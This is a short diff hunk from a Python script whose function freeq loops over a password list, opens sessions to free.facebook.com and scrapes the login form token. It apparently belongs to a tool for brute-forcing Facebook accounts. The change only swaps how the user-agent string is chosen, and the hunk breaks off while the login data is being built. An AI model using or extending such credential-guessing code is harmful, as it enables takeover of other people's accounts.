@@ -635,12 +635,12 @@ def freeq(uid,pwx,tl):
     global loop
     global ok
     global cp
-    global ugen
+    global aqib_ua
     try:
         for ps in pwx:
             bi = random.choice([A])
             session = requests.Session()
-            pro = random.choice(aqib_ua)
+            pro = aqib_ua
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
